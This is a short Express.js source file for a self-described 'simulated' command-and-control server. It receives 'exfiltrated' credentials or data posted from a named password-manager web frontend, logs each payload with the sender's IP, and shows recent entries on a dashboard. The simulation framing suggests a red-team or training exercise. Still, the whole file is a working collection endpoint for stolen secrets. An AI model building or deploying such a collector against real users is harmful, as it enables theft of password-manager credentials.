const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();

// CORS options to allow requests only from your password manager frontend
const corsOptions = {
  origin: 'https://password-manager-i38ngq92o-loxy1235s-projects.vercel.app',
  methods: ['GET', 'POST', 'OPTIONS'],
  credentials: true, // Allow cookies & credentials
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));
app.use(bodyParser.json({ limit: '1mb' }));

const LOG_FILE = path.join(__dirname, 'sim_c2_log.jsonl');

// Append received data to log file
function appendLog(obj) {
  fs.appendFileSync(LOG_FILE, JSON.stringify(obj) + '\n', 'utf8');
}

// Endpoint to receive "exfiltrated" credentials or data from password manager page
app.post('/c2/upload', (req, res) => {
  const entry = {
    received_at: new Date().toISOString(),
    source_ip: req.ip,
    payload: req.body
  };
  appendLog(entry);
  console.log('Simulated exfil received:', entry.payload && entry.payload.simulation ? 'simulation' : '(payload)');
  res.json({ ok: true, message: 'simulated C2 received payload' });
});

// Simple dashboard to view received data
app.get('/dashboard', (req, res) => {
  let lines = [];
  try {
    lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean).slice(-30).map(l=>JSON.parse(l));
  } catch(e) {
    lines = [];
  }
  const html = `
    <html><head><title>Sim C2</title><meta charset="utf-8"></head>
    <body style="font-family:system-ui;padding:16px">
      <h1>Simulated C2</h1>
      ${lines.length === 0 ? '<p>No payloads yet</p>' : lines.map(l=>`<div style="margin:8px;padding:8px;border:1px solid #eee"><div><strong>${l.received_at}</strong> from ${l.source_ip}</div><pre>${escapeHtml(JSON.stringify(l.payload, null, 2))}</pre></div>`).join('')}
    </body></html>
  `;
  res.send(html);
});

// HTML escaping to avoid injection on dashboard
function escapeHtml(s) {
  return s.replace(/[&<>]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
}

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => console.log(`Simulated C2 server listening on port ${PORT}`));
